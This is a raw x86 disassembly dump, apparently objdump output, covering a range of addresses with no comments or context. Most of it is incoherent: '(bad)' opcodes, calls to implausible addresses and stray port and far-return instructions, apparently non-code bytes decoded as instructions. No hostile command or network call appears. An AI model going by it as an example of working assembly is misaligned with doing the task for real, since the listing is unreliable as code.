  432d99:	test   DWORD PTR [ebx],eax
  432d9b:	paddb  mm6,mm0
  432d9e:	add    DWORD PTR [eax],eax
  432da0:	dec    ebp
  432da1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432da7:	mov    esi,DWORD PTR [edx]
  432da9:	or     al,0x2b
  432dab:	dec    ebp
  432dac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432db2:	mov    esp,edi
  432db4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dbb:	mov    DWORD PTR [ebx],ebp
  432dbd:	call   0xc76b6ed
  432dc2:	mov    DWORD PTR [ebp+0x10],ecx
  432dc5:	(bad)  
  432dc6:	push   0x8b85ff10
  432dcb:	clc    
  432dcc:	or     al,0x54
  432dce:	(bad)  
  432dcf:	push   ecx
  432dd0:	retf   
  432dd1:	mov    ebx,0xff4d8dc8
  432dd6:	mov    DWORD PTR [ebp+0x8],eax
  432dd9:	xor    eax,DWORD PTR [ebp-0x75]
  432ddc:	cmp    ebp,DWORD PTR [ebx]
  432dde:	lsl    ebx,WORD PTR [edi-0x8]
  432de2:	call   DWORD PTR [ebx-0x741bff75]
  432de8:	(bad)  
  432de9:	or     al,0x5b
  432deb:	dec    ebp
  432dec:	or     BYTE PTR [ebx],dh
  432dee:	inc    ebp
  432def:	xor    esi,DWORD PTR ds:0x708088d
  432df5:	in     eax,0x9b
  432df7:	add    BYTE PTR [edx],dh
  432df9:	inc    ebp
  432dfa:	pop    edi
  432dfb:	xor    eax,edx
  432dfd:	test   DWORD PTR [eax],0x81108b8b
  432e03:	dec    ebp
  432e04:	sub    al,0x33
  432e06:	add    BYTE PTR [ebx],dh
  432e08:	push   esi
  432e09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e0f:	mov    edi,eax
  432e11:	or     BYTE PTR [ebp+0x45],al
  432e14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e1a:	xor    ecx,ecx
  432e1c:	pushf  
  432e1d:	push   es
  432e1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e25:	dec    ebp
  432e26:	inc    ebp
  432e27:	cmp    BYTE PTR [ecx],0x54
  432e2a:	pushf  
  432e2b:	gs (bad) 
  432e2d:	shl    esp,1
  432e2f:	dec    ebp
  432e30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e36:	shr    ecx,1
  432e38:	xlat   BYTE PTR ds:[ebx]
  432e39:	rol    bh,cl
  432e3b:	mov    edx,esp
  432e3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432e43:	mov    ecx,DWORD PTR [eax]
  432e45:	or     BYTE PTR [eax],al
  432e47:	push   ebp
  432e48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e4e:	dec    ebp
  432e4f:	enter  0xceba,0x8
  432e53:	retf   0x1807
  432e56:	ret    0x9b4d
  432e59:	mov    esi,DWORD PTR [edx]
  432e5b:	or     al,0x33
  432e5d:	into   
  432e5e:	add    edx,esi
  432e60:	add    ecx,edx
  432e62:	bswap  eax
  432e64:	ror    esi,0x98
  432e67:	dec    ebp
  432e68:	add    cl,ch
  432e6a:	mov    edi,edi
  432e6c:	hlt    
  432e6d:	inc    esi
  432e6f:	inc    ebp
  432e70:	ret    0x4533
  432e73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e79:	or     BYTE PTR [ebx],dh
  432e7b:	dec    ebp
  432e7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e82:	jne    0xff8d2e49
  432e88:	inc    ebp
  432e89:	inc    ebp
  432e8a:	mov    esi,DWORD PTR [ebx]
  432e8c:	clc    
  432e8d:	pop    esi
  432e8e:	ret    0xcaeb
  432e91:	mov    eax,esi
  432e93:	call   0x52048366
  432e98:	dec    ebp
  432e99:	add    eax,0xf8728b
  432e9e:	adc    eax,0xce0ccac9
  432ea3:	push   ebp
  432ea4:	ret    0xc6ec
  432ea7:	in     al,dx
  432ea8:	call   0x33437bb1
  432ead:	push   edi
  432eae:	add    edi,eax
  432eb0:	xor    eax,eax
  432eb2:	jmp    0x432ef9
  432eb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432eba:	add    eax,edi
  432ebc:	shr    eax,cl
  432ebe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ec4:	mov    esi,DWORD PTR [edx]
  432ec6:	in     al,dx
  432ec7:	pushf  
  432ec8:	ret    0x84c7
  432ecb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ed1:	inc    ebp
  432ed2:	in     al,dx
  432ed3:	xor    DWORD PTR [ebp-0x64],eax
  432ed6:	mov    eax,edi
  432ed8:	cld    
  432ed9:	fmul   st(2),st
  432edb:	sbb    dl,al
  432edd:	jmp    0x9c3b:0x304d45c1
  432ee4:	jbe    0x432ead
  432ee6:	mov    esp,eax
  432ee8:	clc    
  432ee9:	add    BYTE PTR [ebp+0x0],cl
  432eec:	mov    ecx,ecx
  432eee:	lea    eax,[ebp-0x5]
  432ef1:	mov    edi,edi
  432ef3:	call   0x51ce833d
  432ef8:	hlt    
  432ef9:	xor    eax,edx
  432efb:	mov    esi,0x9b7284
  432f00:	xor    cl,dl
  432f02:	mov    esi,eax
  432f04:	hlt    
  432f05:	into   
  432f06:	inc    ebp
  432f07:	scas   eax,DWORD PTR es:[edi]
  432f08:	mov    ebp,ecx
  432f0a:	cld    
  432f0b:	add    dl,cl
  432f0d:	add    dl,al
  432f0f:	inc    ebp
  432f10:	shr    DWORD PTR [ebx],0x4d
  432f13:	xor    edi,DWORD PTR [ebx]
  432f15:	mov    DWORD PTR [edi],ecx
  432f17:	clc    
  432f18:	dec    esi
  432f19:	inc    ebp
  432f1a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f20:	ret    0xc6ca
  432f23:	mov    BYTE PTR [ebp-0x32],0x53
  432f27:	scas   eax,DWORD PTR es:[edi]
  432f28:	inc    ebp
  432f29:	jmp    0x432f5b
  432f2b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f32:	pop    ebx
  432f33:	xor    ecx,DWORD PTR [ebp+0x3]
  432f36:	mov    eax,DWORD PTR [ebx]
  432f38:	clc    
  432f39:	test   edx,ecx
  432f3b:	mov    ecx,esi
  432f3d:	cld    
  432f3e:	call   0x8ab77488
  432f43:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f49:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f4f:	fdiv   QWORD PTR [ebx]
  432f51:	retf   0xce89
  432f54:	in     al,0xc1
  432f56:	inc    ebp
  432f57:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f5d:	into   
  432f5e:	mov    dh,0xc1
  432f61:	call   0x8c1774ea
  432f66:	(bad)  
  432f67:	cld    
  432f68:	mov    ecx,DWORD PTR [ebp-0x14]
  432f6b:	xor    eax,ecx
  432f6d:	lea    eax,[ebp+0x8]
  432f70:	mov    esi,DWORD PTR [edx-0x4]
  432f73:	add    dl,al
  432f75:	inc    ebp
  432f76:	mov    esp,0x32d89b8b
  432f7b:	dec    ebp
  432f7c:	mov    esi,DWORD PTR [ebx]
  432f7e:	cld    
  432f7f:	xor    eax,edx
  432f81:	sub    esp,DWORD PTR [ebp-0x75]
  432f84:	int    0xec
  432f86:	sub    ecx,eax
  432f88:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f8e:	mov    esi,esp
  432f90:	call   0x34177d19
  432f95:	inc    DWORD PTR [ebx]
  432f97:	mov    edi,DWORD PTR [ebx]
  432f99:	cld    
  432f9a:	jne    0x432fe9
  432f9c:	mov    esi,DWORD PTR [ebx]
  432f9e:	aam    0x8d
  432fa0:	dec    ebp
  432fa1:	or     BYTE PTR [ebx],dh
  432fa3:	jb     0x432fa8
  432fa5:	add    BYTE PTR [edi+0x45],bl
  432fa8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432faf:	xor    ebp,esp
  432fb1:	xor    eax,edi
  432fb3:	sub    edi,esp
  432fb5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fbb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fc2:	inc    ebp
  432fc3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fc9:	clc    
  432fca:	mov    eax,edi
  432fcc:	nop
  432fcd:	fadd   QWORD PTR [eax]
  432fcf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fd5:	jmp    0x432f60
  432fd7:	mov    eax,DWORD PTR [ecx]
  432fd9:	fadd   DWORD PTR [eax]
  432fdb:	inc    ebp
  432fdc:	or     DWORD PTR [ebx],esi
  432fde:	dec    eax
  432fdf:	add    edx,DWORD PTR [ebx-0x2d]
  432fe2:	dec    ebp
  432fe3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fe9:	inc    ebp
  432fea:	push   esp
  432feb:	mov    dl,BYTE PTR [ecx-0xd]
  432fee:	xor    ecx,DWORD PTR [ebp-0x45]
  432ff1:	(bad)  
  432ff3:	rol    BYTE PTR [eax],0xc1
  432ff6:	ret    
  432ff7:	inc    ebp
  432ff8:	inc    ebp
  432ff9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fff:	xor    eax,ebx
  433001:	add    eax,DWORD PTR [ebp+0x23]
  433004:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43300a:	cmp    edi,0xc
  43300d:	dec    ebp
  43300e:	inc    ebp
  43300f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433015:	inc    ebp
  433016:	mov    esi,DWORD PTR [ebx]
  433018:	clc    
  433019:	lea    eax,[ebp+0x45725407]
  43301f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433023:	xor    edi,DWORD PTR [eax]
  433025:	mov    ecx,0xff8b8d4d
  43302a:	push   esp
  43302b:	enter  0x4df7,0x23
  43302f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433035:	mov    eax,DWORD PTR [ebx]
  433037:	loopne 0x433024
  433039:	ret    0xc68b
  43303c:	push   esp
  43303d:	enter  0x9745,0x8b
  433041:	inc    ebp
  433042:	cld    
  433043:	mov    eax,edi
  433045:	clc    
  433046:	ret    
  433047:	ret    0xc645
  43304a:	mov    esi,DWORD PTR [ebx]
  43304c:	cld    
  43304d:	pop    esi
  43304e:	mov    ebx,0x83458bc3
  433054:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433058:	dec    ebp
  433059:	xor    DWORD PTR [ebx],esi
  43305b:	pushf  
  43305c:	add    edi,DWORD PTR [edx-0x7767a77]
  433062:	fcom   DWORD PTR [ebp+0x45]
  433065:	mov    esi,DWORD PTR [ebx]
  433067:	adc    al,0x9c
  433069:	inc    ebp
  43306a:	(bad)  
  43306b:	mov    ebx,eax
  43306d:	adc    al,0x85
  43306f:	cmp    al,0x1
  433072:	inc    ebp
  433073:	add    BYTE PTR ds:0xe98b9c4d,bh
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	nop
  43307c:	add    BYTE PTR [eax],al
  43307e:	inc    ebp
  43307f:	mov    esi,DWORD PTR [ebx]
  433081:	add    eax,DWORD PTR [ebx]
  433083:	cmp    al,0x89
  433085:	mov    esp,esi
  433087:	clc    
  433088:	inc    ebp
  433089:	inc    ebp
  43308a:	add    edx,DWORD PTR [esi+0xc]
  43308d:	mov    edi,0x7ff0845
  433092:	in     al,dx
  433093:	(bad)  
  433094:	jne    0x433031
  433096:	mov    esi,DWORD PTR [edx]
  433098:	clc    
  433099:	add    ebp,DWORD PTR [esi]
  43309b:	mov    edi,edi
  43309d:	in     al,dx
  43309e:	mov    DWORD PTR [ebp-0x10],eax
  4330a1:	xor    eax,DWORD PTR [ebp+0x3]
  4330a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4330b0:	lea    ecx,[ecx+0x45e8d4bc]
  4330b6:	clc    
  4330b7:	mov    edi,edi
  4330b9:	cmp    BYTE PTR [ebp+0x4d],al
  4330bc:	test   DWORD PTR [eax+0x74],ecx
  4330bf:	inc    ecx
  4330c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330c6:	ret    
  4330c7:	inc    eax
  4330c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330ce:	push   eax
  4330cf:	dec    eax
  4330d0:	test   al,0xd0
  4330d2:	dec    eax
  4330d4:	mov    eax,DWORD PTR [ebp-0x14]
  4330d7:	mov    eax,DWORD PTR [ebp+0x38]
  4330da:	mov    eax,ecx
  4330dc:	fadd   DWORD PTR [ebx]
  4330de:	dec    ebp
  4330df:	inc    eax
  4330e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330e6:	inc    ebp
  4330e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330ed:	fadd   QWORD PTR [ebx]
  4330ef:	inc    ebp
  4330f0:	or     al,0x33
  4330f2:	dec    ebp
  4330f3:	add    edi,DWORD PTR [ebx]
  4330f5:	mov    DWORD PTR [edx-0x28],esi
  4330f8:	mov    eax,DWORD PTR [ebp-0x10]
  4330fb:	mov    eax,DWORD PTR [eax+0x10]
  4330fe:	mov    eax,edi
  433100:	lock ret 
  433102:	inc    ecx
  433103:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433109:	fsubr  st,st(5)
  43310b:	test   DWORD PTR [eax],eax
  43310d:	clc    
  43310e:	push   0x45
  433110:	(bad)  
  433111:	cmp    al,0xec
  433113:	pushf  
  433114:	inc    ebp
  433115:	(bad)  
  433116:	push   eax
  433117:	fsub   DWORD PTR [eax-0x7b]
  43311a:	(bad)  
  43311b:	clc    
  43311c:	mov    eax,0xf8008584
  433121:	mov    eax,DWORD PTR [ebp-0x4]
  433124:	mov    edi,0x4585c3cc
  43312a:	clc    
  43312b:	mov    eax,DWORD PTR [ebp+0x14]
  43312e:	xor    eax,DWORD PTR [ebp-0x64]
  433131:	mov    edi,eax
  433133:	in     al,dx
  433134:	les    esi,FWORD PTR [ebp-0x7b]
  433137:	mov    edi,eax
  433139:	or     al,0x4d
  43313b:	dec    ebp
  43313c:	mov    eax,ebp
  43313e:	in     al,0xf2
  433140:	dec    ebp
  433141:	dec    DWORD PTR [ecx+0x4dc7e045]
  433147:	fmul   DWORD PTR [ecx+0x4df8f085]
  43314d:	inc    ebp
  43314e:	mov    DWORD PTR [ebx],esi
  433150:	fadd   QWORD PTR [ebx]
  433152:	dec    ebp
  433153:	push   eax
  433154:	xor    eax,DWORD PTR [ebp+0x3]
  433157:	push   eax
  433158:	mov    DWORD PTR [eax+ebx*8],ebx
  43315b:	push   esi
  43315d:	mov    eax,DWORD PTR [eax]
  43315f:	lock cmp eax,0xf84e85c0
  433165:	inc    ebp
  433166:	test   BYTE PTR [ebx],dh
  433168:	add    DWORD PTR [ebx],eax
  43316a:	add    BYTE PTR [eax+0x4d],dl
  43316d:	jne    0x4331a2
  43316f:	lea    ecx,[ebx-0x7617fc44]
  433175:	div    ah
  433177:	inc    DWORD PTR [ebp+0x45]
  43317a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433180:	jb     0x43310d
  433182:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433189:	mov    ecx,DWORD PTR [ebp-0x10]
  43318c:	xor    ecx,DWORD PTR [ebp+0x3]
  43318f:	mov    edi,DWORD PTR [ebx]
  433191:	adc    BYTE PTR [ebp+0x41],dh
  433194:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43319a:	ret    
  43319b:	push   ss
  43319c:	push   0x45
  43319e:	lea    ecx,[ebx+0x4de80cb0]
  4331a4:	sti    
  4331a5:	add    edi,edi
  4331a7:	or     BYTE PTR [ebp+0x4d],al
  4331aa:	mov    ebp,DWORD PTR [ebx]
  4331ac:	xor    ebp,ecx
  4331ae:	mov    al,BYTE PTR [edx]
  4331b0:	add    eax,0xc7200
  4331b5:	jne    0x433204
  4331b7:	lea    esi,[ebx]
  4331b9:	mov    al,0xf
  4331bb:	call   0xf2880
  4331c0:	shl    DWORD PTR [ecx],0x84
  4331c3:	pushf  
  4331c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331ca:	mov    esi,DWORD PTR [edx]
  4331cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331d3:	test   DWORD PTR [eax],eax
  4331d5:	clc    
  4331d6:	dec    ebp
  4331d7:	inc    ebp
  4331d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4331db:	pushf  
  4331dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331e3:	lea    eax,[ecx]
  4331e5:	int3   
  4331e6:	add    BYTE PTR [ebp+0x45],cl
  4331e9:	lea    ecx,[ebx-0x75b2cc38]
  4331ef:	lea    eax,ds:0x4d72c4
  4331f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4331f8:	xor    ecx,edi
  4331fa:	bswap  ebx
  4331fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433200:	rol    DWORD PTR [ecx],0x84
  433203:	add    BYTE PTR [ecx],al
  433205:	xor    eax,DWORD PTR [eax]
  433207:	pushf  
  433208:	inc    ebp
  433209:	jnp    0x8a43660c
  43320f:	mov    eax,DWORD PTR ds:0xcf72e8
  433215:	lock dec ebp
  433217:	retf   
  433218:	xor    ecx,DWORD PTR [ebp+0xf]
  43321b:	mov    eax,eax
  43321d:	fmul   st,st(3)
  43321f:	test   ecx,0x19b8484
  433225:	xor    al,BYTE PTR [eax]
  433227:	mov    DWORD PTR [ebp-0x28],eax
  43322a:	mov    eax,DWORD PTR [ebp+0x33]
  43322d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433233:	ret    
  433234:	add    al,cl
  433236:	dec    ebp
  433237:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43323d:	add    ecx,DWORD PTR ds:0xc7250
  433243:	inc    ebp
  433244:	rcl    DWORD PTR [eax+0x4d],0x2b
  433248:	mov    edi,edi
  43324a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433250:	jb     0x433219
  433252:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433259:	mov    esi,DWORD PTR [ebx]
  43325b:	cld    
  43325c:	mov    cl,bh
  43325e:	or     eax,0x372b6
  433263:	cmp    ecx,eax
  433265:	jne    0x4332e2
  43326b:	mov    eax,DWORD PTR [ebp-0x20]
  43326e:	mov    eax,DWORD PTR [eax]
  433270:	xor    eax,edi
  433272:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433279:	mov    ecx,DWORD PTR [ebp-0x4]
  43327c:	mov    ecx,edi
  43327e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433284:	jb     0x433295
  433286:	add    BYTE PTR [edi-0x3f],dl
  433289:	add    BYTE PTR [ebp-0x75],cl
  43328c:	mov    esi,eax
  43328e:	xor    eax,DWORD PTR [eax]
  433290:	mov    al,bh
  433292:	or     eax,0x4b7284
  433297:	xor    al,cl
  433299:	mov    ecx,DWORD PTR [ebp-0x4]
  43329c:	mov    ecx,edi
  43329e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332a4:	jb     0x4332b5
  4332a6:	add    BYTE PTR [edi],dh
  4332a8:	enter  0x8500,0x8b
  4332ac:	add    ah,bl
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	inc    ebp
  4332b1:	(bad)  
  4332b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332b9:	mov    esi,DWORD PTR [edx-0x4]
  4332bc:	add    bh,cl
  4332be:	dec    ebp
  4332bf:	mov    dh,0x8b
  4332c1:	add    esi,DWORD PTR [ebx]
  4332c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332c9:	add    BYTE PTR [eax],al
  4332cb:	mov    eax,ecx
  4332cd:	loopne 0x43331c
  4332cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332d5:	dec    ebx
  4332d6:	or     eax,0x8b7232
  4332db:	in     al,0xc1
  4332dd:	or     DWORD PTR [ebp-0x31],ecx
  4332e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332e7:	xor    dh,BYTE PTR [edx-0x75]
  4332ea:	add    al,dh
  4332ec:	enter  0x4f09,0xcf
  4332f0:	inc    ebp
  4332f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4332f7:	or     al,BYTE PTR ds:0xe4728b
  4332fd:	or     DWORD PTR [ebp-0x31],ecx
  433300:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433307:	cmp    dh,BYTE PTR [edx+0xf]
  43330a:	add    bl,dl
  43330c:	rol    DWORD PTR [eax],0x4d
  43330f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433315:	(bad)  
  433316:	or     eax,0x4b7284
  43331b:	xor    al,cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x20]
  433320:	mov    ecx,DWORD PTR [ecx]
  433322:	xor    ecx,edi
  433324:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43332b:	xor    cl,al
  43332d:	mov    ecx,DWORD PTR [edi]
  43332f:	fadd   QWORD PTR [ebp+0x9]
  433332:	call   0xffd02e06
  433337:	dec    ebx
  433338:	dec    ebp
  433339:	xor    bh,BYTE PTR [ebx]
  43333b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43333f:	loopne 0x43333d
  433341:	or     edi,eax
  433343:	iret   
  433344:	ret    
  433345:	mov    WORD PTR [ebp+0x4f],es
  433348:	mov    esi,DWORD PTR [edx]
  43334a:	call   0x8452fa89
  43334f:	(bad)  
  433350:	fwait
  433351:	add    BYTE PTR [edx],dh
  433353:	mov    esi,DWORD PTR [ebx]
  433355:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43335b:	test   BYTE PTR [ebx],dh
  43335d:	dec    ebx
  43335e:	add    esi,DWORD PTR [edx]
  433360:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433366:	dec    edi
  433368:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43336f:	xor    al,BYTE PTR [ebx]
  433371:	mov    edi,DWORD PTR [ebx]
  433373:	in     al,0x75
  433375:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43337b:	dec    ebx
  43337c:	xor    esi,DWORD PTR [edx]
  43337e:	lea    ecx,[edx]
  433380:	or     BYTE PTR [ebx+0x900f072],cl
  433386:	ja     0x433357
  433388:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43338f:	cmp    ch,al
  433391:	jne    0x433386
  433393:	mov    edi,edi
  433395:	fadd   QWORD PTR [ebp+0x0]
  433398:	mov    eax,edi
  43339a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333a1:	mov    edx,DWORD PTR [ebx]
  4333a3:	in     al,0x45
  4333a5:	or     DWORD PTR [ebx],esi
  4333a7:	iret   
  4333a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333af:	xor    dl,BYTE PTR [eax-0x75]
  4333b2:	sbb    al,0xe0
  4333b4:	dec    DWORD PTR [ecx]
  4333b6:	mov    ecx,edi
  4333b8:	in     al,dx
  4333b9:	mov    eax,es
  4333bb:	dec    ebx
  4333bc:	mov    DWORD PTR [edx],esi
  4333be:	fmul   QWORD PTR [edx]
  4333c0:	jne    0x43334d
  4333c2:	(bad)  
  4333c3:	(bad)  
  4333c5:	or     DWORD PTR [ebp-0x31],eax
  4333c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333cf:	cmp    bh,bh
  4333d1:	jne    0x433418
  4333d3:	lea    ecx,[ebx-0x38372750]
  4333d9:	inc    ebx
  4333db:	mov    eax,ecx
  4333dd:	mov    eax,0xa00c111
  4333e2:	jne    0x433429
  4333e4:	mov    esi,DWORD PTR [ebx]
  4333e6:	test   al,0x3
  4333e8:	inc    ebp
  4333e9:	mov    DWORD PTR [eax-0xc],edx
  4333ec:	loop   0x433433
  4333ee:	push   DWORD PTR [ebx]
  4333f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333f6:	add    DWORD PTR [eax],eax
  4333f8:	mov    eax,edi
  4333fa:	lods   al,BYTE PTR ds:[esi]
  4333fb:	dec    ebp
  4333fc:	inc    ebp
  4333fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433403:	retf   
  433404:	mov    edx,ecx
  433406:	adc    al,0x84
  433408:	(bad)  
  433409:	std    
  43340a:	ret    
  43340b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433411:	hlt    
  433412:	rol    edi,0x82
  433415:	ret    
  433416:	cld    
  433417:	enter  0x11ff,0x45
  43341b:	inc    ebp
  43341c:	pop    edi
  43341d:	mov    ebx,DWORD PTR [ebx+0x14]
  433420:	ret    0xc7
  433423:	test   BYTE PTR [ebx+0x4532519b],cl
  433429:	jmp    0x4333b6
  43342b:	push   0x8
  43342d:	call   DWORD PTR [esi]
  43342f:	in     al,dx
  433430:	add    BYTE PTR [ebp+0x1],0x50
  433434:	add    bh,ah
  433436:	add    bh,bh
  433438:	icebp  
  433439:	mov    ecx,DWORD PTR [eax]
  43343b:	cld    
  43343c:	pop    es
  43343d:	dec    ebp
  43343e:	shl    DWORD PTR [ebx],0x72
  433441:	add    eax,DWORD PTR [eax]
  433443:	cmp    edx,ecx
  433445:	je     0x433457
  433447:	mov    esi,DWORD PTR [ebp-0x4]
  43344a:	inc    edi
  43344c:	or     al,0xc3
  43344e:	jmp    FWORD PTR [edx-0x18]
  433451:	(bad)  
  433452:	sti    
  433453:	cwde   
  433454:	(bad)  
  433455:	call   0xffa12d60
  43345a:	or     al,0x45
  43345c:	push   ebp
  43345d:	sub    esp,0x18
  433460:	push   ebx
  433461:	inc    ebp
  433462:	mov    edi,edi
  433464:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43346b:	test   al,0x54
  43346d:	inc    ebp
  43346e:	push   ecx
  43346f:	push   eax
  433470:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433476:	add    ah,bh
  433478:	(bad)  
  433479:	dec    ebp
  43347a:	add    DWORD PTR [ebx],esi
  43347c:	inc    ebp
  43347d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433483:	push   0xffffff8b
  433485:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43348b:	add    eax,DWORD PTR [ecx]
  43348d:	or     BYTE PTR [eax],al
  43348f:	call   0xff852c94
  433494:	mov    eax,DWORD PTR [ebp+0x14]
  433497:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43349d:	inc    ebp
  43349e:	dec    ecx
  43349f:	add    ebp,DWORD PTR [edx+0x14]
  4334a2:	push   0x8b3045
  4334a7:	call   0x33ad821c
  4334ac:	inc    DWORD PTR [ebx]
  4334ae:	mov    DWORD PTR [edi],ecx
  4334b0:	mov    eax,ecx
  4334b2:	or     BYTE PTR [ebp-0x3d],cl
  4334b5:	cmp    eax,edi
  4334b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334c2:	adc    al,0xc9
  4334c4:	inc    ebp
  4334c5:	adc    BYTE PTR [eax+0x55],dl
  4334c8:	jne    0x4334b6
  4334ca:	call   0xff54345a
  4334cf:	dec    ebp
  4334d0:	inc    ebp
  4334d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334d7:	add    BYTE PTR [ebx],bh
  4334d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334dd:	push   esp
  4334de:	or     al,0x51
  4334e0:	dec    ebp
  4334e1:	xor    DWORD PTR [ebx],0xf32039b
  4334e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ea:	mov    edi,edi
  4334ec:	pop    edi
  4334ed:	adc    BYTE PTR [ebx+0x75],bl
  4334f0:	ret    0x50
  4334f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334f7:	(bad)  
  4334f8:	clc    
  4334f9:	mov    esp,ebp
  4334fb:	pop    ecx
  4334fc:	mov    ecx,0xf80085c2
  433501:	mov    ecx,DWORD PTR [ecx+edx*2]
  433504:	push   esi
  433505:	push   esi
  433506:	(bad)  
  433507:	lock add DWORD PTR [ebp+0x44],eax
  43350b:	mov    edx,DWORD PTR [eax]
  43350d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433511:	or     BYTE PTR [edi+eax*1+0x51],dl
  433515:	ret    
  433516:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43351c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433522:	or     al,0x80
  433524:	jge    0x433527
  433526:	mov    DWORD PTR [eax],eax
  433528:	and    al,0x8
  43352a:	cmp    DWORD PTR [ebp+0x10],eax
  43352d:	mov    edx,DWORD PTR [esi]
  43352f:	xchg   esp,eax
  433530:	dec    esp
  433531:	add    BYTE PTR [eax],dl
  433533:	mov    ecx,edx
  433535:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433539:	dec    ebp
  43353a:	into   
  43353b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433541:	mov    edx,DWORD PTR [eax+0x14]
  433544:	das    
  433545:	add    al,0x45
  433547:	add    BYTE PTR [ebp+0x0],dh
  43354a:	mov    edi,edi
  43354c:	and    al,0x50
  43354e:	mov    eax,DWORD PTR [eax]
  433550:	and    al,0xd1
  433552:	xor    eax,DWORD PTR [esi]
  433554:	lea    eax,[ebp+0x8]
  433557:	xor    esi,DWORD PTR [edx+0x3]
  43355a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433560:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433566:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433570:	cmp    al,0xff
  433572:	pushf  
  433573:	mov    edi,edi
